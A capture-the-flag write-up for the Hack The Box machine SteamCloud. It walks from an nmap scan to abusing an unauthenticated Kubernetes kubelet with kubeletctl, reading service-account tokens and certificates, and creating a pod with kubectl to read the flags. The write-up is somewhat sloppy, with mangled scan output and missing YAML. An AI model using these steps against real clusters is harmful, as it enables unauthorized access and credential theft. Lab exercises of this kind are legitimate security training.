---
title: SteamCloud Machine HTB
date: 2023-02-1 00:18:00 +0700
categories: [TOP_CATEGORIE, SUB_CATEGORIE]
tags: [machines]
---

## Enumeration

```ruby
 PORT STATUS SERVICE VERSION
 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
 | ssh-hostkey: 
 | 2048 fcfb90ee7c73a1d4bf87f871e844c63c (RSA)
 | 256 46832b1b01db71646a3e27cb536f81a1 (ECDSA)
 |256 1d8dd341f3ffa437e8ac780889c2e3c5 (ED25519)
 2379/tcp open ssl/etcd-client?
 | tls-alpn: 
 |_ h2
 | ssl-cert: Subject: commonName=steamcloud
 | Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.129.100.253, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:0:0:0:1
 |Invalid before: 2022-11-17T20:33:08
 |_ssl-date: Not valid after: 2023-11-17T20:33:09
 |_ssl-date: TLS randomness does not represent time
 2380/tcp open ssl/etcd-server?
 | tls-alpn: 
 |_ h2
 | ssl-cert: Subject: commonName=steamcloud
 | Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.129.100.253, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:0:0:0:1
 |Invalid before: 2022-11-17T20:33:08
 |_ssl-date: Not valid after: 2023-11-17T20:33:09
 |_ssl-date: TLS randomization does not represent time
 8443/tcp open ssl/https-alt
 | fingerprint-strings: 
 | FourOhFourRequest: 
 | HTTP/1.0 403 Forbidden
 | Audit-Id: e6c52384-d61c-4697-ae29-cefc13646345
 | Cache-Control: no-cache, private
 | Content-Type: application/json
 | X-Content-Type-Options: nosniff
 | X-Kubernetes-Pf-Flowschema-Uid: 6a20aa9c-6a62-4b31-b688-2e6450915419
 | X-Kubernetes-Pf-Prioritylevel-Uid: 68e373cb-64b3-405b-a8ae-68fb633e17f2
 | Date: Thu, 17 Nov 2022 20:38:37 GMT
 | Content: 212
 | {"kind": "Status", "apiVersion": "v1", "metadata":{}, "status": "Failure", "message": "forbidden: "User "system:anonymous" cannot get path"/nice ports,/Trinity.txt.bak"", "reason": "Forbidden", "details":{}, "code":403}
 | GetRequest: 
 | HTTP/1.0 403 Forbidden
 | Audit-Id: 9179f2a5-3526-44c6-9dc4-b8a2e3624547
 | Cache-Control: no-cache, private
 | Content-Type: application/json
 | X-Content-Type-Options: nosniff
 | X-Kubernetes-Pf-Flowschema-Uid: 6a20aa9c-6a62-4b31-b688-2e6450915419
 | X-Kubernetes-Pf-Prioritylevel-Uid: 68e373cb-64b3-405b-a8ae-68fb633e17f2
 | Date: Thu, 17 Nov 2022 20:38:36 GMT
 | Content: 185
 | {"kind": "Status", "apiVersion": "v1", "metadata":{}, "status": "Failed", "message": "forbidden: "User "system:anonymous" cannot get path "/"", "reason": "Forbidden", "details":{}, "code":403}
 | HTTPOptions: 
 | HTTP/1.0 403 Forbidden
| Audit-Id: c8cc664f-0379-4728-b17a-bd8bd4943cf0
| Cache-Control: no-cache, private
| Content-Type: application/json
| X-Content-Type-Options: nosniff
| X-Kubernetes-Pf-Flowschema-Uid: 6a20aa9c-6a62-4b31-b688-2e6450915419
| X-Kubernetes-Pf-Prioritylevel-Uid: 68e373cb-64b3-405b-a8ae-68fb633e17f2
| Date: Thu, 17 Nov 2022 20:38:36 GMT
| Contents: 189
|_ {"kind": "Status", "apiVersion": "v1", "metadata":{}, "status": "Failed", "message": "forbidden: "User "system:anonymous" cannot options path "/"", "reason": "Forbidden", "details":{}, "code":403}
|_http-title: Site has no title (application/json).
| tls-alpn: 
| h2
|_http/1.1
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:kubernetes, DNS:localhost, IP Address:10.129.100.253, IP Addre
ss:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
|Invalid before: 2022-11-16T20:33:06
|_ssl-date: Not valid after: 2025-11-16T20:33:06
|_ssl-date: TLS randomness does not represent time
10249/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site has no title (text/plain; charset=utf-8).
10250/tcp open ssl/http Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site has no title (text/plain; charset=utf-8).
|_ssl-date: TLS randomness does not represent time.
| ssl-cert: Subject: commonName=steamcloud@1668717190
|_ssl-cert: Subject alternate name: DNS:steamcloud
| Not valid before: 2022-11-17T19:33:10
| Invalid after: 2023-11-17T19:33:10
| tls-alpn: 
| h2
| http/1.1
10256/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site has no title (text/plain; charset=utf-8).
1 service not recognized despite returning data. If you know the service/version, please send the following fingerprint to https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.93%T=SSL%I=7%D=11/17%Time=63769BCC%P=x86_64-pc-linux-g
```

Looking at port 10250 we already know that we are dealing with kubernetes, and 8443 for tomcat and https.

# User exploit 

We investigate about kubernetes in hacktricks:
https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/kubernetes-basics

Using the command
```shell
kubeletctl pods --server 10.129.100.253 
```

We can see that it has a default service, which is nginx.

If we do 
```shell
kubeletctl scan token --server 10.129.100.253
```

we can get the account token of each service, getting the nginx account token again, but I don't know if it does any good.

With the command 
```shell
kubeletctl scan rce --server 10.129.100.253
```
we see that nginx has a RCE, so let's exploit it. However, with the following command we can see the user.txt:

```shell
kubeletctl run "cat /root/user.txt" --namespace default --pod nginx --container nginx --server 10.129.100.253
```

## Root exploit

Using the command 
```shell
kubeletctl run "cat /run/secrets/kubernetes.io/serviceaccount/ca.crt" --namespace default --pod nginx --container nginx --server 10.129.100.253
```

we can see the nginx certificate (I guess)

and the token:

```shell
kubeletctl run "cat /var/run/secrets/kubernetes.io/serviceaccount/token" --namespace default --pod nginx --container nginx --server 10.129.100.253
```

Once we have it, we can connect to the machine:

```shell
export token = (Token previously taken)

kubectl --token=$token --certificate-authority=ca.crt --
server=https://10.129.100.253:8443 get pods
```

Once we are inside, let's see what permissions we have:

```shell
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.100.253:8443 auth can-i --list
```

and we see that we can create lists in the pods and their respective permissions.

As we have the list and create permissions, we can create a new user from a .yaml file.

Let's create the `nginx` pod and list it :
```shell
kubectl --token=$token --certificate-authority=ca.crt --
server=https://10.129.100.253:8443 apply -f f.yaml

kubectl --token=$token --certificate-authority=ca.crt --
server=https://10.129.100.253:8443 get pods
```

finally, we can see the root.txt
```shell
kubeletctl --server 10.129.100.253 exec "cat /root/root/root.txt" -p nginxt -c nginxt
```

 

